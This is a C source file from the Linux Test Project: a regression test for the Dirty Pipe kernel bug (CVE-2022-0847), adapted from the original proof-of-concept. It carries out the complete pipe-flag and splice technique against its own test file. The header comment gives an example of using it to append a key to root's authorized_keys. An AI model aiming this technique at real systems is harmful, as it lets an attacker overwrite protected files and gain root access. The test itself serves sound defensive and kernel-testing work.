// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * Author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Ported into LTP by Yang Xu <xuyang2018.jy@fujitsu.com>
 */

/*\
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include "tst_test.h"

#define TEXT "AAAAAAAABBBBBBBB"
#define TESTFILE "testfile"
#define CHUNK 64
#define BUFSIZE 4096

static int p[2] = {-1, -1}, fd = -1;
static char *pattern_buf, *read_buf;

static void check_file_contents(void)
{
	SAFE_LSEEK(fd, 0, SEEK_SET);
	SAFE_READ(1, fd, read_buf, 4096);

	if (memcmp(pattern_buf, read_buf, 4096) != 0)
		tst_res(TFAIL, "read buf data mismatch, bug exists");
	else
		tst_res(TPASS, "read buff data match, bug doesn't exist");
}

/*
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(void)
{
	unsigned int pipe_size, total, n, len;
	char buffer[BUFSIZE];

	SAFE_PIPE(p);
	pipe_size = SAFE_FCNTL(p[1], F_GETPIPE_SZ);

	/*
	 * fill the pipe completely; each pipe_buffer will now have the
	 * PIPE_BUF_FLAG_CAN_MERGE flag
	 */
	for (total = pipe_size; total > 0;) {
		n = total > sizeof(buffer) ? sizeof(buffer) : total;
		len = SAFE_WRITE(SAFE_WRITE_ALL, p[1], buffer, n);
		total -= len;
	}

	/*
	 * drain the pipe, freeing all pipe_buffer instances (but leaving the
	 * flags initialized)
	 */
	for (total = pipe_size; total > 0;) {
		n = total > sizeof(buffer) ? sizeof(buffer) : total;
		len = SAFE_READ(1, p[0], buffer, n);
		total -= len;
	}

	/*
	 * the pipe is now empty, and if somebody adds a new pipe_buffer
	 * without initializing its "flags", the buffer wiill be mergeable
	 */
}

static void run(void)
{
	int data_size, len;
	ssize_t nbytes;

	data_size = strlen(TEXT);

	fd = SAFE_OPEN(TESTFILE, O_RDONLY);

	prepare_pipe();

	/*
	 * splice one byte from the start into the pipe;
	 * this will add a reference to the page cache, but since
	 * copy_page_to_iter_pipe() does not initialize the "flags",
	 * PIPE_BUF_FLAG_CAN_MERGE is still set
	 */
	nbytes = splice(fd, NULL, p[1], NULL, 1, 0);
	if (nbytes < 0)
		tst_brk(TFAIL, "splice failed");
	if (nbytes == 0)
		tst_brk(TFAIL, "short splice");

	/*
	 * the following write will not create a new pipe_buffer, but
	 * will instead write into the page cache, because of the
	 * PIPE_BUF_FLAG_CAN_MERGE flag
	 */
	len = SAFE_WRITE(SAFE_WRITE_ALL, p[1], TEXT, data_size);
	if (len < nbytes)
		tst_brk(TFAIL, "short write");

	check_file_contents();
	SAFE_CLOSE(p[0]);
	SAFE_CLOSE(p[1]);
	SAFE_CLOSE(fd);
}

static void setup(void)
{
	memset(pattern_buf, 0xff, BUFSIZE);
	tst_fill_file(TESTFILE, 0xff, CHUNK, BUFSIZE / CHUNK);
}

static void cleanup(void)
{
	if (p[0] > -1)
		SAFE_CLOSE(p[0]);
	if (p[1] > -1)
		SAFE_CLOSE(p[1]);
	if (fd > -1)
		SAFE_CLOSE(fd);
}

static struct tst_test test = {
	.setup = setup,
	.cleanup = cleanup,
	.test_all = run,
	.needs_tmpdir = 1,
	.bufs = (struct tst_buffers []) {
		{&pattern_buf, .size = 4096},
		{&read_buf, .size = 4096},
		{},
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "9d2231c5d74e"},
		{"CVE", "CVE-2022-0847"},
		{},
	}
};
